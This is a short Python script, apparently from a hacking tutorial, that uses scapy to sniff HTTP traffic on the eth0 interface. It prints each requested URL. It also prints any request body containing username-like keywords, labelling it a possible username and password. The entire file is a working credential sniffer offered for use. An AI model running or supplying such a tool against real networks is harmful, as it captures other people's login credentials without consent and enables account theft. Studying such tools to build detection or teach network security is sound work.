#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http #need to issue this first: pip install scapy_http

def sniffer(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    
def getUrl(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def getLoginInfo(packet):
    if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords_username = ["username", "user", "UserName", "login", "Username"]
            for keyword in keywords_username:
                if keyword in str(load):
                    return load
                    #break

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        #print(packet.show()
        url = getUrl(packet)
        print("[+] HTTP Request >> {}".format(url))
        loginInfo = getLoginInfo(packet)
        if loginInfo:
            print("\n\n[+] Possible UserName & Password > {} \n\n".format(loginInfo))

        
    
sniffer("eth0")